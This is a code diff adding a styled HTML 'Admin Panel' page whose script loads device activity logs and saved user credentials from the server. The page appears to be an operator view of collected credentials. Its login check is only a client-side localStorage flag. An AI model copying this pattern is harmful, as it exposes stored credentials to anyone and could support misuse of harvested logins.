@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Panel</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: url('https://img.freepik.com/free-vector/stream-binary-code-design-vector_53876-164420.jpg?t=st=1744749871~exp=1744753471~hmac=45a17f67802b0cd170c49576d1f84450b32a665450000dedd184dd4d5b8c2365&w=996') no-repeat center center fixed;
+      background-size: cover;
+      position: relative;
+      color: #fff;
+    }
+
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 0;
+    }
+
+    h2 {
+      margin-top: 40px;
+      position: relative;
+      z-index: 1;
+      text-align: center;
+    }
+
+    .button-container {
+      margin-top: 30px;
+      position: relative;
+      z-index: 1;
+      text-align: center;
+    }
+
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #00adb5;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin: 10px;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #007b80;
+      transform: scale(1.05);
+    }
+
+    .section {
+      display: none;
+      margin: 30px auto;
+      padding: 20px;
+      background-color: rgba(255, 255, 255, 0.9);
+      border-radius: 10px;
+      width: 90%;
+      max-width: 700px;
+      color: #333;
+      text-align: left;
+      z-index: 1;
+      position: relative;
+      animation: fadeIn 0.5s ease-out;
+    }
+
+    .section p {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .section div {
+      background-color: #f1f1f1;
+      padding: 12px;
+      border-radius: 5px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-15px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body>
+  <h2>Welcome to the Admin Panel</h2>
+
+  <div class="button-container">
+    <button id="logsBtn">View Logs</button>
+    <button id="credentialsBtn">View Credentials</button>
+    <button id="logoutBtn">Logout</button> <!-- Logout button added -->
+  </div>
+
+  <!-- Device Activity Logs Section -->
+  <div id="logsSection" class="section">
+    <p><strong>Device Activity Logs:</strong></p>
+    <div id="logs">Loading logs...</div>
+  </div>
+
+  <!-- User Credentials Section -->
+  <div id="credentialsSection" class="section">
+    <p><strong>Saved User Credentials:</strong></p>
+    <div id="credentials">Loading credentials...</div>
+  </div>
+
+  <script>
+    // Check if the user is logged in
+    if (!localStorage.getItem("isLoggedIn")) {
+      window.location.href = "/login";  // Redirect to login if not logged in
+    }
+
+    async function loadLogs() {
+      const response = await fetch('/logs');
+      const data = await response.json();
+      document.getElementById('logs').innerText = data.logs || 'No logs available';
+    }
+
+    async function loadCredentials() {
+      const response = await fetch('/credentials');
+      const data = await response.json();
+      document.getElementById('credentials').innerText = data.credentials || 'No credentials available';
+    }
+
+    document.getElementById('logsBtn').addEventListener('click', () => {
+      document.getElementById('credentialsSection').style.display = 'none';
+      document.getElementById('logsSection').style.display = 'block';
+      loadLogs();
+    });
+
+    document.getElementById('credentialsBtn').addEventListener('click', () => {
+      document.getElementById('logsSection').style.display = 'none';
+      document.getElementById('credentialsSection').style.display = 'block';
+      loadCredentials();
+    });
+
+    // Logout functionality
+    document.getElementById('logoutBtn').addEventListener('click', () => {
+      // Remove logged-in status from localStorage
+      localStorage.removeItem("isLoggedIn");
+
+      // Redirect to login page
+      window.location.href = "/login";
+    });
+  </script>
+</body>
+</html>
